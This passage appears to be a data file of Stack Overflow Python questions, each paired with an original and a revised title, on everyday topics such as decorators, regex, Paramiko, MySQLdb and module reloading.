Python list slice used for no obvious reason, I occasionally see the list slice syntax used in Python code like this: Surely this is just the same as: Or am I missing something? <code>  newList = oldList[:] newList = oldList,Python list slice syntax used for no obvious reason
Python Decorators run before function it is decorating is called?," As an example: The problem I am having is, the @get_booking decorator is being called even before I called the function that I am decorating.Output on start: I haven't even made a call to a function that is decorated at this point.I am just getting started with decorators, so maybe I am missing something. <code>  def get_booking(f=None): print ""Calling get_booking Decorator"" def wrapper(request, **kwargs): booking = _get_booking_from_session(request) if booking == None: # we don't have a booking in our session. return HttpRedirect('/') else: return f(request=request, booking=booking, **kwargs) return wrapper@get_bookingdef do_stuff(request, booking): # do stuff here Calling get_booking DecoratorCalling get_booking DecoratorCalling get_booking DecoratorCalling get_booking DecoratorCalling get_booking DecoratorCalling get_booking DecoratorCalling get_booking DecoratorCalling get_booking DecoratorCalling get_booking DecoratorCalling get_booking Decorator[26/Oct/2008 19:54:04] ""GET /onlinebooking/?id=1,2 HTTP/1.1"" 302 0[26/Oct/2008 19:54:05] ""GET /onlinebooking/ HTTP/1.1"" 200 2300[26/Oct/2008 19:54:05] ""GET /site-media/css/style.css HTTP/1.1"" 200 800[26/Oct/2008 19:54:05] ""GET /site-media/css/jquery-ui-themeroller.css HTTP/1.1"" 200 25492",Decorators run before function it is decorating is called?
Read file as string in python, I'm using urllib2 to read in a page. I need to do a quick regex on the source and pull out a few variables but urllib2 presents as a file object rather than a string.I'm new to python so I'm struggling to see how I use a file object to do this. Is there a quick way to convert this into a string? <code> ,Read file object as string in python
Read web page as string in python, I'm using urllib2 to read in a page. I need to do a quick regex on the source and pull out a few variables but urllib2 presents as a file object rather than a string.I'm new to python so I'm struggling to see how I use a file object to do this. Is there a quick way to convert this into a string? <code> ,Read file object as string in python
Regex Problem Group Name Redefintion?," So I have this regex: Now if I try and do a match against this: I get this error: If I can't define the same group twice in the same regex expression for two different cases, what do I do? <code>  (^(\s+)?(?P<NAME>(\w)(\d{7}))((01f\.foo)|(\.bar|\.goo\.moo\.roo))$|(^(\s+)?(?P<NAME2>R1_\d{6}_\d{6}_)((01f\.foo)|(\.bar|\.goo\.moo\.roo))$)) B048661501f.foo File ""C:\Python25\lib\re.py"", line 188, in compile return _compile(pattern, flags) File ""C:\Python25\lib\re.py"", line 241, in _compile raise error, v # invalid expressionsre_constants.error: redefinition of group name 'NAME' as group 9; was group 3",Regex Problem Group Name Redefinition?
Python - Parse String to Float or Int," In Python, how can I parse a numeric string like to its corresponding float value, ? Or parse the string ""31"" to an integer, 31?I just want to know how to parse a float str to a float, and (separately) an int str to an int. <code>  ""545.2222"" 545.2222",How do I parse a string to a float or int?
Parse String to Float or Int," In Python, how can I parse a numeric string like to its corresponding float value, ? Or parse the string ""31"" to an integer, 31?I just want to know how to parse a float str to a float, and (separately) an int str to an int. <code>  ""545.2222"" 545.2222",How do I parse a string to a float or int?
How do I parse a string to a float or int in Python?," In Python, how can I parse a numeric string like to its corresponding float value, ? Or parse the string ""31"" to an integer, 31?I just want to know how to parse a float str to a float, and (separately) an int str to an int. <code>  ""545.2222"" 545.2222",How do I parse a string to a float or int?
Flattening a shallow list in python," Is there a simple way to flatten a list of iterables with a list comprehension, or failing that, what would you all consider to be the best way to flatten a shallow list like this, balancing performance and readability?I tried to flatten such a list with a nested list comprehension, like this: But I get in trouble of the NameError variety there, because the name 'menuitem' is not defined. After googling and looking around on Stack Overflow, I got the desired results with a reduce statement: But this method is fairly unreadable because I need that list(x) call there because x is a Django QuerySet object.Conclusion: Thanks to everyone who contributed to this question. Here is a summary of what I learned. I'm also making this a community wiki in case others want to add to or correct these observations.My original reduce statement is redundant and is better written this way: This is the correct syntax for a nested list comprehension (Brilliant summary dF!): But neither of these methods are as efficient as using itertools.chain: And as @cdleary notes, it's probably better style to avoid * operator magic by using chain.from_iterable like so: <code>  [image for image in menuitem for menuitem in list_of_menuitems] reduce(list.__add__, map(lambda x: list(x), list_of_menuitems)) >>> reduce(list.__add__, (list(mi) for mi in list_of_menuitems)) >>> [image for mi in list_of_menuitems for image in mi] >>> from itertools import chain>>> list(chain(*list_of_menuitems)) >>> chain = itertools.chain.from_iterable([[1,2],[3],[5,89],[],[6]])>>> print(list(chain))>>> [1, 2, 3, 5, 89, 6]",Flattening a shallow list in Python
Monitoring GMAIL account via push instead of pull using python and imaplib," Is there a way to monitor a gmail account using imaplib without polling gmail each time I want to see if there is new mail. Or in other words, I just want the script to be notified of a new message so I can process it right away instead of any lag time between polls.I see that the IMAP protocol supports this with the IDLE command, but I can't see anything documented with it in the imaplib docs, so any help with this would be great! <code> ",How do I enable push-notification for IMAP (Gmail) using Python imaplib?
How do I monitor an IMAP (Gmail) account via push instead of pull using Python imaplib?," Is there a way to monitor a gmail account using imaplib without polling gmail each time I want to see if there is new mail. Or in other words, I just want the script to be notified of a new message so I can process it right away instead of any lag time between polls.I see that the IMAP protocol supports this with the IDLE command, but I can't see anything documented with it in the imaplib docs, so any help with this would be great! <code> ",How do I enable push-notification for IMAP (Gmail) using Python imaplib?
Best Way To Determine if a Sequence is in another sequence in Python," This is a generalization of the ""string contains substring"" problem to (more) arbitrary types.Given an sequence (such as a list or tuple), what's the best way of determining whether another sequence is inside it? As a bonus, it should return the index of the element where the subsequence starts:Example usage (Sequence in Sequence): So far, I just rely on brute force and it seems slow, ugly, and clumsy. <code>  >>> seq_in_seq([5,6], [4,'a',3,5,6])3>>> seq_in_seq([5,7], [4,'a',3,5,6])-1 # or None, or whatever",Best way to determine if a sequence is in another sequence?
Best way to determine if a sequence is in another sequence in Python," This is a generalization of the ""string contains substring"" problem to (more) arbitrary types.Given an sequence (such as a list or tuple), what's the best way of determining whether another sequence is inside it? As a bonus, it should return the index of the element where the subsequence starts:Example usage (Sequence in Sequence): So far, I just rely on brute force and it seems slow, ugly, and clumsy. <code>  >>> seq_in_seq([5,6], [4,'a',3,5,6])3>>> seq_in_seq([5,7], [4,'a',3,5,6])-1 # or None, or whatever",Best way to determine if a sequence is in another sequence?
Python: unpack to unknown number of variables?," How could I unpack a tuple of unknown to, say, a list?I have a number of columns of data and they get split up into a tuple by some function. I want to unpack this tuple to variables but I do not know how many columns I will have. Is there any way to dynamically unpack it to as many variables as I need? <code> ",Unpack to unknown number of variables?
Why was execfile canceled in Python 3.0?, It seems they canceled in Python 3 all the easy way to quickly load a script by removing execfile() Is there an obvious alternative I'm missing? <code> ,What is an alternative to execfile in Python 3?
What is an alternative to execfile in Python 3.0?, It seems they canceled in Python 3 all the easy way to quickly load a script by removing execfile() Is there an obvious alternative I'm missing? <code> ,What is an alternative to execfile in Python 3?
python: how to unload a module?, I have a long-running Python server and would like to be able to upgrade a service without restarting the server. What's the best way do do this? <code>  if foo.py has changed: unimport foo <-- How do I do this? import foo myfoo = foo.Foo(),How do I unload (reload) a module?
How do I unload (reload) a Python module?, I have a long-running Python server and would like to be able to upgrade a service without restarting the server. What's the best way do do this? <code>  if foo.py has changed: unimport foo <-- How do I do this? import foo myfoo = foo.Foo(),How do I unload (reload) a module?
How to reload a Python module?, I have a long-running Python server and would like to be able to upgrade a service without restarting the server. What's the best way do do this? <code>  if foo.py has changed: unimport foo <-- How do I do this? import foo myfoo = foo.Foo(),How do I unload (reload) a module?
Does the below Python code hang for anyone else?," Put the following into a file hello.py (and easy_install paramiko if you haven't got it): Fill in the first line appropriately.Now type and you'll see some ls output.Now instead type and then from within the interpreter type and voila! It hangs! It will unhang if you wrap the code in a function foo and do import hello; hello.foo() instead.Why does Paramiko hang when used within module initialization? How is Paramiko even aware that it's being used during module initialization in the first place? <code>  hostname,username,password='fill','these','in'import paramikoc = paramiko.SSHClient()c.set_missing_host_key_policy(paramiko.AutoAddPolicy())c.connect(hostname=hostname, username=username, password=password)i,o,e = c.exec_command('ls /')print(o.read())c.close() python hello.py python import hello",Why does Paramiko hang if you use it while loading a module?!
How can I install beautifulsoap -Python module to Mac?, I read this without finding the solution: http://docs.python.org/install/index.html <code> ,How can I install the Beautiful Soup module on the Mac?
How can I install beautifulsoup -Python module to Mac?, I read this without finding the solution: http://docs.python.org/install/index.html <code> ,How can I install the Beautiful Soup module on the Mac?
Which softwares can help in making simulations by Python?," Yesterday I made a simulation using Python. I had a few difficulties with variables and debugging.Is there any software for Python, which provides a decent debugger?Related question: What is the best way to debug my Python code? <code> ",Suggestions for Python debugging tools?
Which software can help in making simulations by Python?," Yesterday I made a simulation using Python. I had a few difficulties with variables and debugging.Is there any software for Python, which provides a decent debugger?Related question: What is the best way to debug my Python code? <code> ",Suggestions for Python debugging tools?
Suggestions for python debugging tools?," Yesterday I made a simulation using Python. I had a few difficulties with variables and debugging.Is there any software for Python, which provides a decent debugger?Related question: What is the best way to debug my Python code? <code> ",Suggestions for Python debugging tools?
python super() raises TypeError ! Why ?," In Python 2.5, the following code raises a TypeError: If I replace the class X with class X(object), it will work. What's the explanation for this? <code>  >>> class X: def a(self): print ""a"">>> class Y(X): def a(self): super(Y,self).a() print ""b"">>> c = Y()>>> c.a()Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""<stdin>"", line 3, in aTypeError: super() argument 1 must be type, not classobj",Python super() raises TypeError
Case insensitive Python regular expression without re.compile," In Python, I can compile a regular expression to be case-insensitive using re.compile: Is there a way to do the same, but without using re.compile. I can't find anything like Perl's i suffix (e.g. m/test/i) in the documentation. <code>  >>> s = 'TeSt'>>> casesensitive = re.compile('test')>>> ignorecase = re.compile('test', re.IGNORECASE)>>> >>> print casesensitive.match(s)None>>> print ignorecase.match(s)<_sre.SRE_Match object at 0x02F0B608>",Case insensitive regular expression without re.compile?
Problem in underntanding a line Python code," What does the last line mean in the following code? My attempt to the problem:"""".join... uses join -method to empty texte[1] * e[0] multiplies two subsequent values in the sequence, eI am not sure what is eI am not sure, what it means, when you have something before for -loop, like: e[1] * e[0] for e in elt <code>  import pickle, urllib handle = urllib.urlopen(""http://www.pythonchallenge.com/pc/def/banner.p"") data = pickle.load(handle) handle.close() for elt in data: print """".join([e[1] * e[0] for e in elt])",Problem in understanding Python list comprehensions
Problem in understanding a line Python code," What does the last line mean in the following code? My attempt to the problem:"""".join... uses join -method to empty texte[1] * e[0] multiplies two subsequent values in the sequence, eI am not sure what is eI am not sure, what it means, when you have something before for -loop, like: e[1] * e[0] for e in elt <code>  import pickle, urllib handle = urllib.urlopen(""http://www.pythonchallenge.com/pc/def/banner.p"") data = pickle.load(handle) handle.close() for elt in data: print """".join([e[1] * e[0] for e in elt])",Problem in understanding Python list comprehensions
What is the best way to remove accents in a python unicode string?," I have a Unicode string in Python, and I would like to remove all the accents (diacritics).I found on the web an elegant way to do this (in Java):convert the Unicode string to its long normalized form (with a separate character for letters and diacritics)remove all the characters whose Unicode type is ""diacritic"".Do I need to install a library such as pyICU or is this possible with just the Python standard library? And what about python 3?Important note: I would like to avoid code with an explicit mapping from accented characters to their non-accented counterpart. <code> ",What is the best way to remove accents (normalize) in a Python unicode string?
What is the best way to remove accents in a Python unicode string?," I have a Unicode string in Python, and I would like to remove all the accents (diacritics).I found on the web an elegant way to do this (in Java):convert the Unicode string to its long normalized form (with a separate character for letters and diacritics)remove all the characters whose Unicode type is ""diacritic"".Do I need to install a library such as pyICU or is this possible with just the Python standard library? And what about python 3?Important note: I would like to avoid code with an explicit mapping from accented characters to their non-accented counterpart. <code> ",What is the best way to remove accents (normalize) in a Python unicode string?
How to clear python interpreter console?," Like most Python developers, I typically keep a console window open with the Python interpreter running to test commands, dir() stuff, help() stuff, etc.Like any console, after a while the visible backlog of past commands and prints gets to be cluttered, and sometimes confusing when re-running the same command several times. I'm wondering if, and how, to clear the Python interpreter console.I've heard about doing a system call and either calling cls on Windows or clear on Linux, but I was hoping there was something I could command the interpreter itself to do.Note: I'm running on Windows, so Ctrl+L doesn't work. <code> ",How to clear the interpreter console?
Does Python have class prototypes?," I have a series of Python classes in a file. Some classes reference others.My code is something like this: Trying to run that, I get NameError: name 'C' is not defined. Fair enough, but is there any way to make it work, or do I have to manually re-order my classes to accommodate? In C++, I can create a class prototype. Does Python have an equivalent?(I'm actually playing with Django models, but I tried not complicate matters). <code>  class A(): passclass B(): c = C()class C(): pass",Does Python have class prototypes (or forward declarations)?
Shebang problem," I'm trying to run a python script. It works fine when I run it: The problem starts when I add a shebang: Result in: Try 2: Result in: When I run them directly in the terminal they both work just fine: Any hints on how to make this work with shebang? <code>  python2.5 myscript.py inpt0 #!/usr/bin/env python2.5 $ myscript.py inpt0: No such file or directory #!/usr/local/bin/python2.5 $ myscript.py inpt0: bad interpreter: No such file or directoryon2.5 $ /usr/local/bin/python2.5Python 2.5.4 (r254:67916, Feb 9 2009, 12:50:32)[GCC 3.2.3 20030502 (Red Hat Linux 3.2.3-52)] on linux2Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.>>>$ /usr/bin/env python2.5Python 2.5.4 (r254:67916, Feb 9 2009, 12:50:32)[GCC 3.2.3 20030502 (Red Hat Linux 3.2.3-52)] on linux2Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.>>>",Adding a shebang causes No such file or directory error when running my python script
Python or Ruby on Rails for a .NET developer ?," I'm a C# .NET developer and I work on mostly ASP.NET projects.I want to learn a new programming language,to improve my programming skills by experiencing a new language, to see something different then microsoft environment,and maybe to think in a different way.I focus on two languages for my goal. Python and Ruby.Which one do you offer for me ? Pros and cons of them on each other?Is it worth learning them ?EDIT : Sorry I editted my post but not inform here, Ruby on Rails replaced with Ruby. <code> ",Python or Ruby for a .NET developer ?
pydev debugger breakpoints," I am debugging a problem in Django with Pydev.I can set breakpoint in my django project code with out a problem.However I can't set breakpoints in the Django library source code (in site-packages). The PyDev debugger user interface in this case simply does nothing when I click to set the breakpoint and does not break at that location when I run the debugger.Am I missing some PyDev configuration? In other debuggers I have used, this behavior indicates a problem relating the debug information with the source code.Any ideas on next steps would be a help.I also have the site-packages configured in PyDev to be in my PYTHONPATHI am using Eclipse on Max OS X if that helps.Thanks <code> ",Eclipse PyDev: setting breakpoints in site-packages  source 
PyDev: setting breakpoints in Library source ," I am debugging a problem in Django with Pydev.I can set breakpoint in my django project code with out a problem.However I can't set breakpoints in the Django library source code (in site-packages). The PyDev debugger user interface in this case simply does nothing when I click to set the breakpoint and does not break at that location when I run the debugger.Am I missing some PyDev configuration? In other debuggers I have used, this behavior indicates a problem relating the debug information with the source code.Any ideas on next steps would be a help.I also have the site-packages configured in PyDev to be in my PYTHONPATHI am using Eclipse on Max OS X if that helps.Thanks <code> ",Eclipse PyDev: setting breakpoints in site-packages  source 
How to get console window width in python," Is there a way in python to programmatically determine the width of the console? I mean the number of characters that fits in one line without wrapping, not the pixel width of the window.EditLooking for a solution that works on Linux <code> ",How to get Linux console window width in Python
Create an empty array / matrix in Numpy," I can't figure out how to use an array or matrix in the way that I would normally use a list. I want to create an empty array (or matrix) and then add one column (or row) to it at a time.At the moment the only way I can find to do this is like: Whereas if it were a list, I'd do something like this: Is there a way to use that kind of notation for NumPy arrays or matrices? <code>  mat = Nonefor col in columns: if mat is None: mat = col else: mat = hstack((mat, col)) list = []for item in data: list.append(item)",How do I create an empty array/matrix in NumPy?
Discovering public IP programatically," I'm behind a router, I need a simple command to discover my public ip (instead of googling what's my ip and clicking one the results)Are there any standard protocols for this? I've heard about STUN but I don't know how can I use it?P.S. I'm planning on writing a short python script to do it <code> ",Discovering public IP programmatically
Another Django Forms  : Foreign Key in Hidden Field," My form: Owner, in the model, is a ForeignKey to a Profile.When I set this form, I set the value of ""owner"" to be a Profile object.But when this comes out on the form, it seems to contain the name of the Profile like this: When the form is submitted and gets back to my views.py I try to handle it like this: However, what I get is a type-conversion error as it fails to turn the string ""phil"" (the user's name that was saved into the ""owner"" field) into an Int to turn it into the ForeignKey.So what is going on here. Should a ModelForm represent a foreign key as a number and transparently handle it? Or do I need to extract the id myself into the owner field of the form? And if so, how and when do I map it back BEFORE I try to validate the form?  <code>  class PlanForm(forms.ModelForm): owner = forms.ModelChoiceField(label="""", queryset=Profile.objects.all(), widget=forms.HiddenInput()) etc... class Meta: model = Plan <input type=""hidden"" name=""owner"" value=""phil"" id=""id_owner"" /> form = PlanForm(request.POST) ... if form.is_valid(): plan = form.save() return HttpResponseRedirect('/plans/%s'%plan.id) # Redirect after POST",Django Forms: Foreign Key in Hidden Field
Google Data Source JSON not valid?," I am implementing a Google data source using their Python library. I would like the response from the library to be able to be imported in another Python script using the simplejson library.However, even their example doesn't validate in JSONLint: How do I tweak the simplejson 'loads' function to import the above JSON content? I think the main problem is that the object keys are not strings.I would rather not write a regular expression to convert the keys to strings since I think such code would be annoying to maintain.I am currently getting an ""Expecting property name: line 1 column 1 (char 1)"" error when trying to import the above JSON into Python with simplejson. <code>  {cols: [{id:'name',label:'Name',type:'string'}, {id:'salary',label:'Salary',type:'number'}, {id:'full_time',label:'Full Time Employee',type:'boolean'}],rows: [{c:[{v:'Jim'},{v:800,f:'$800'},{v:false}]}, {c:[{v:'Bob'},{v:7000,f:'$7,000'},{v:true}]}, {c:[{v:'Mike'},{v:10000,f:'$10,000'},{v:true}]}, {c:[{v:'Alice'},{v:12500,f:'$12,500'},{v:true}]}]}",Is Google data source JSON not valid?
How do I sum the first value in each tuple in a list of tuples in python?," I have a list of tuples (always pairs) like this: I'd like to find the sum of the first items in each pair, i.e.: How can I do this in Python? At the moment I'm iterating through the list: I have a feeling there must be a more Pythonic way. <code>  [(0, 1), (2, 3), (5, 7), (2, 1)] 0 + 2 + 5 + 2 sum = 0for pair in list_of_pairs: sum += pair[0]",How do I sum the first value in each tuple in a list of tuples in Python?
Problem Inserting numbers into MS Access database using ADO via Python," [Edit 2: More information and debugging in answer below...]I'm writing a python script to export MS Access databases into a series of text files to allow for more meaningful version control (I know - why Access? Why aren't I using existing solutions? Let's just say the restrictions aren't of a technical nature).I've successfully exported the full contents and structure of the database using ADO and ADOX via the comtypes library, but I'm getting a problem re-importing the data.I'm exporting the contents of each table into a text file with a list on each line, like so: And the following function to import the said file: Everything works fine except that numerical values (double and int) are being inserted as zeros. Any ideas on whether the problem is with my code, eval, comtypes, or ADO?Edit: I've fixed the problem with inserting numbers - casting them as strings(!) seems to solve the problem for both double and integer fields.However, I now have a different issue that had previously been obscured by the above: the first field in every row is being set to 0 regardless of data type... Any ideas? <code>  [-9, u'No reply'][1, u'My home is as clean and comfortable as I want'][2, u'My home could be more clean or comfortable than it is'][3, u'My home is not at all clean or comfortable'] import osimport sysimport datetimeimport comtypes.client as clientfrom ADOconsts import *from access_consts import *class Db: def create_table_contents(self, verbosity = 0): conn = client.CreateObject(""ADODB.Connection"") rs = client.CreateObject(""ADODB.Recordset"") conn.ConnectionString = self.new_con_string conn.Open() for fname in os.listdir(self.file_path): if fname.startswith(""Table_""): tname = fname[6:-4] if verbosity > 0: print ""Filling table %s."" % tname conn.Execute(""DELETE * FROM [%s];"" % tname) rs.Open(""SELECT * FROM [%s];"" % tname, conn, adOpenDynamic, adLockOptimistic) f = open(self.file_path + os.path.sep + fname, ""r"") data = f.readline() print repr(data) while data != '': data = eval(data.strip()) print data[0] print rs.Fields.Count rs.AddNew() for i in range(rs.Fields.Count): if verbosity > 1: print ""Into field %s (type %s) insert value %s."" % ( rs.Fields[i].Name, str(rs.Fields[i].Type), data[i]) rs.Fields[i].Value = data[i] data = f.readline() print repr(data) rs.Update() rs.Close() conn.Close()",Problem Inserting data into MS Access database using ADO via Python
Preserve order of attributes when modifying with mindom," Is there a way I can preserve the original order of attributes when processing XML with minidom?Say I have: <color red=""255"" green=""255"" blue=""233"" />when I modify this with minidom the attributes are rearranged alphabetically blue, green, and red. I'd like to preserve the original order.I am processing the file by looping through the elements returned by elements = doc.getElementsByTagName('color') and then I do assignments like this e.attributes[""red""].value = ""233"". <code> ",Preserve order of attributes when modifying with minidom
Is there a way to substring a string in Python?," Is there a way to substring a string in Python, to get a new string from the third character to the end of the string?Maybe like myString[2:end]?If leaving the second part means 'till the end', and if you leave the first part, does it start from the start? <code> ",How do I get a substring of a string in Python?
Is there a way to substring a string?," Is there a way to substring a string in Python, to get a new string from the third character to the end of the string?Maybe like myString[2:end]?If leaving the second part means 'till the end', and if you leave the first part, does it start from the start? <code> ",How do I get a substring of a string in Python?
How to substring a string in Python?," Is there a way to substring a string in Python, to get a new string from the third character to the end of the string?Maybe like myString[2:end]?If leaving the second part means 'till the end', and if you leave the first part, does it start from the start? <code> ",How do I get a substring of a string in Python?
"What is a clean, pythonic way to have multiple constructors in Python?"," I can't find a definitive answer for this. As far as I know, you can't have multiple __init__ functions in a Python class. So how do I solve this problem?Suppose I have a class called Cheese with the number_of_holes property. How can I have two ways of creating cheese objects...One that takes a number of holes like this: parmesan = Cheese(num_holes = 15)And one that takes no arguments and just randomizes the number_of_holes property: gouda = Cheese()I can think of only one way to do this, but this seems clunky: What do you say? Is there another way? <code>  class Cheese(): def __init__(self, num_holes = 0): if (num_holes == 0): # Randomize number_of_holes else: number_of_holes = num_holes","What is a clean, Pythonic way to have multiple constructors in Python?"
What encoding do I need to display a GBP sign (pound sign) using python on cygwin?," I have a python (2.5.4) script which I run in cygwin (in a DOS box on Windows XP). I want to include a pound sign () in the output. If I do so, I get this error: OK. So I looked at that PEP, and now tried adding this to the beginning of my script: That stopped the error, but the output shows where it should show .I've tried ISO-8859-1 as well, with the same result.Does anyone know which encoding I need?Or where I could look to find out? <code>  SyntaxError: Non-ASCII character '\xa3' in file dbscan.py on line 253, but no encoding declared; see http://www.python.org/peps/pep-0263.html for details # coding=cp437",What encoding do I need to display a GBP sign (pound sign) using python on cygwin in Windows XP?
Python: Date Ordinal Output?," I'm wondering if there is a quick and easy way to output ordinals given a number in python.For example, given the number 1, I'd like to output ""1st"", the number 2, ""2nd"", et cetera, et cetera.This is for working with dates in a breadcrumb trail is what is currently shownI'd like to have something along the lines of <code>  Home > Venues > Bar Academy > 2009 > April > 01 Home > Venues > Bar Academy > 2009 > April > 1st",Date Ordinal Output?
Iterating over object instances of a given class in Pyhton," Given a class that keeps a registry of its Objects: How would I make the following code work (without using Person.__registry): While researching I found a hint that one could go for a __metaclass__ with a __getitem__-method. Any ideas how this would look like? <code>  class Person(object): __registry = [] def __init__(self, name): self.__registry.append(self) self.name = name for personobject in Person: print personobject",Iterating over object instances of a given class in Python
Python: MySQLdb Connection Problems," I'm having trouble with the MySQLdb module. (I'm using a custom port)the error I get is: Which doesn't make much sense since that's the default connection set in my.conf.. it's as though it's ignoring the connection info I give..The mysql server is definitely there: I tried directly from the python prompt: I'm confused... :( <code>  db = MySQLdb.connect( host = 'localhost', user = 'root', passwd = '', db = 'testdb', port = 3000) Error 2002: Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2) [root@baster ~]# mysql -uroot -p -P3000Enter password: Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 19Server version: 5.0.77 Source distributionType 'help;' or '\h' for help. Type '\c' to clear the buffer.mysql> use testdb;Database changedmysql> >>> db = MySQLdb.connect(user='root', passwd='', port=3000, host='localhost', db='pyneoform')Traceback (most recent call last):File """", line 1, in File ""/usr/lib64/python2.5/site-packages/MySQLdb/__init__.py"", line 74, in Connectreturn Connection(*args, **kwargs)File ""/usr/lib64/python2.5/site-packages/MySQLdb/connections.py"", line 169, in __init__super(Connection, self).__init__(*args, **kwargs2)_mysql_exceptions.OperationalError: (2002, ""Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)"")>>>",MySQLdb connection problems
"Python - Parse a .py file, read the AST, modify it, then write back the modified source code"," I want to programmatically edit python source code. Basically I want to read a .py file, generate the AST, and then write back the modified python source code (i.e. another .py file).There are ways to parse/compile python source code using standard python modules, such as ast or compiler. However, I don't think any of them support ways to modify the source code (e.g. delete this function declaration) and then write back the modifying python source code.UPDATE: The reason I want to do this is I'd like to write a Mutation testing library for python, mostly by deleting statements / expressions, rerunning tests and seeing what breaks. <code> ","Parse a .py file, read the AST, modify it, then write back the modified source code"
Python Time Seconds to h:m:s," I have a function that returns information in seconds, but I need to store that information in hours:minutes:seconds.Is there an easy way to convert the seconds to this format in Python? <code> ","How do I convert seconds to hours, minutes and seconds?"
"How to convert seconds to hours, minutes and seconds?"," I have a function that returns information in seconds, but I need to store that information in hours:minutes:seconds.Is there an easy way to convert the seconds to this format in Python? <code> ","How do I convert seconds to hours, minutes and seconds?"
Qt and context menu," I need to create a context menu on right clicking at my window. But I really don't know how to achieve that. Are there any widgets for that, or I have to create it from the beginning? Programming language: PythonGraphical lib: Qt (PyQt) <code> ",PyQt and context menu
Does RAD for PHP and/or Python," I am looking for RAD like environment for PHP and/or Python free or not does not matter.It should have a visual environment where one can use a point and click interface so that it is possible to select objects with mouse and move them around.I have looked at Delphi4PHP. The RAD part is fantastic, but I don't like the framework on which it is based VCL4PHP (vcl4php.sourceforge.net) is crappy. Just to deploy a simple Hello world application we will have to deploy 40MB of that framework. That is just stupid.....I looked at Eclipse but it is only a code IDE. Does not have a visual way of designing a page/window. Did I miss any plugin that supports this feature?I was suggested to give NetBeans IDE a close look so I also looked that up, but did not find what I wanted.I have also looked up following but none of these are true RAD:NuSphere PHPEdVS PHP for Visual Studio PHP Designer (not a designer by any means just a plain old IDE)I have not been able to find any descent Python RAD tool also.I have looked up Yes Software's Code Charge Studio (www.yessoftware.com) but it cannot be used to develop complicated applications like say for example an Accounting System or an Inventory Management App, etc.. It is useful but for very simple apps. Making changes to Visual part (referred as components by this people) is a nightmare. Finally it does not support Python. <code> ",Looking for a PHP and/or Python RAD
Creating a shell for .NET programs," I was learning python using the tutorial that comes with the standard python installation. One of the benefits that the author states about python is ""maybe youve written a program that could use an extension language, and you dont want to design and implement a whole new language for your application"" - My question is how would i go about designing a program (using c#) that can be extended using Python interactively(for this to be possible, i would imagine that i would need to create some sort of a ""shell"" or ""interactive"" mode for the .net program) ?Are there any pointers on how to design .NET programs that have an interactive shell. I would then like to use python script in the shell to ""extend"" or interact with the program.EDIT: This question partly stems from the demo give by Miguel de Icaza during PDC 2008 where he showed the interactive csharp command prompt, C# 4.0 i think also has this ""compiler as a service"" feature. I looked at that and thought how cool would it be to design a windows or web program in .NET that had a interactive shell.. and a scripting language like python could be used to extend the features provided by the program.Also, i started thinking about this kind of functionality after reading one of Steve Yegge's essays where he talks about systems that live forever. <code> ",Creating an interactive shell for .NET apps and embed scripting languages like python/iron python into it
Creating an interactive shell for .NET programs," I was learning python using the tutorial that comes with the standard python installation. One of the benefits that the author states about python is ""maybe youve written a program that could use an extension language, and you dont want to design and implement a whole new language for your application"" - My question is how would i go about designing a program (using c#) that can be extended using Python interactively(for this to be possible, i would imagine that i would need to create some sort of a ""shell"" or ""interactive"" mode for the .net program) ?Are there any pointers on how to design .NET programs that have an interactive shell. I would then like to use python script in the shell to ""extend"" or interact with the program.EDIT: This question partly stems from the demo give by Miguel de Icaza during PDC 2008 where he showed the interactive csharp command prompt, C# 4.0 i think also has this ""compiler as a service"" feature. I looked at that and thought how cool would it be to design a windows or web program in .NET that had a interactive shell.. and a scripting language like python could be used to extend the features provided by the program.Also, i started thinking about this kind of functionality after reading one of Steve Yegge's essays where he talks about systems that live forever. <code> ",Creating an interactive shell for .NET apps and embed scripting languages like python/iron python into it
How do you go about creating an interactive shell for .NET programs and embed scripting languages like python/iron python into it?," I was learning python using the tutorial that comes with the standard python installation. One of the benefits that the author states about python is ""maybe youve written a program that could use an extension language, and you dont want to design and implement a whole new language for your application"" - My question is how would i go about designing a program (using c#) that can be extended using Python interactively(for this to be possible, i would imagine that i would need to create some sort of a ""shell"" or ""interactive"" mode for the .net program) ?Are there any pointers on how to design .NET programs that have an interactive shell. I would then like to use python script in the shell to ""extend"" or interact with the program.EDIT: This question partly stems from the demo give by Miguel de Icaza during PDC 2008 where he showed the interactive csharp command prompt, C# 4.0 i think also has this ""compiler as a service"" feature. I looked at that and thought how cool would it be to design a windows or web program in .NET that had a interactive shell.. and a scripting language like python could be used to extend the features provided by the program.Also, i started thinking about this kind of functionality after reading one of Steve Yegge's essays where he talks about systems that live forever. <code> ",Creating an interactive shell for .NET apps and embed scripting languages like python/iron python into it
Creating an interactive shell for .NET programs and embed scripting languages like python/iron python into it," I was learning python using the tutorial that comes with the standard python installation. One of the benefits that the author states about python is ""maybe youve written a program that could use an extension language, and you dont want to design and implement a whole new language for your application"" - My question is how would i go about designing a program (using c#) that can be extended using Python interactively(for this to be possible, i would imagine that i would need to create some sort of a ""shell"" or ""interactive"" mode for the .net program) ?Are there any pointers on how to design .NET programs that have an interactive shell. I would then like to use python script in the shell to ""extend"" or interact with the program.EDIT: This question partly stems from the demo give by Miguel de Icaza during PDC 2008 where he showed the interactive csharp command prompt, C# 4.0 i think also has this ""compiler as a service"" feature. I looked at that and thought how cool would it be to design a windows or web program in .NET that had a interactive shell.. and a scripting language like python could be used to extend the features provided by the program.Also, i started thinking about this kind of functionality after reading one of Steve Yegge's essays where he talks about systems that live forever. <code> ",Creating an interactive shell for .NET apps and embed scripting languages like python/iron python into it
Python: Mixing files and loops," I'm writing a script that logs errors from another program and restarts the program where it left off when it encounters an error. For whatever reasons, the developers of this program didn't feel it necessary to put this functionality into their program by default.Anyways, the program takes an input file, parses it, and creates an output file. The input file is in a specific format: When the program throws an error, it gives you the reference information you need to track the error - namely, the UI, which section (title or abstract), and the line number relative to the beginning of the title or abstract. I want to log the offending sentences from the input file with a function that takes the reference number and the file, finds the sentence, and logs it. The best way I could think of doing it involves moving forward through the file a specific number of times (namely, n times, where n is the line number relative to the beginning of the seciton). The way that seemed to make sense to do this is: I don't see how this would make me lose data, but Python thinks it would, and says ValueError: Mixing iteration and read methods would lose data. Does anyone know how to do this properly? <code>  UI - 26474845TI - the title (can be any number of lines)AB - the abstract (can also be any number of lines) i = 1while i <= lineNumber: print original.readline() i += 